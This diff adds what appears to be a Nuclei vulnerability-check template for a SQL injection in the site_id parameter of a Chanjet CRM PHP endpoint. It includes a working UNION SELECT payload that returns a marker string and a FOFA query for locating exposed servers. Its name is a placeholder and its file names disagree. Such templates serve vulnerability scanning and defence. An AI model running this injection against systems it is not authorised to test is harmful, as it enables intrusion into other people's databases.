@@ -1,0 +1,29 @@
+id: CRM_userspace_sql
+info:
+  name: xxx
+  author: mike
+  severity: info
+  description: 畅捷CRM get_userspace.php文件中 site_id参数存在SQL注入漏洞
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: icon_hash="-1068428644"
+requests:
+  - raw:
+      - |
+        GET /WebSer~1/get_usedspace.php?site_id=-1159%20UNION%20ALL%20SELECT%20CONCAT(0x7178767671,0x5664726e476a637a565a50614d4c435745446a50614756506d486d58544b4e646d7a577170685165,0x7171626b71)-- HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: word
+        part: body
+        words:
+          - qxvvqVdrnGjczVZPaMLCWEDjPaGVPmHmXTKNdmzWqphQeqqbkq
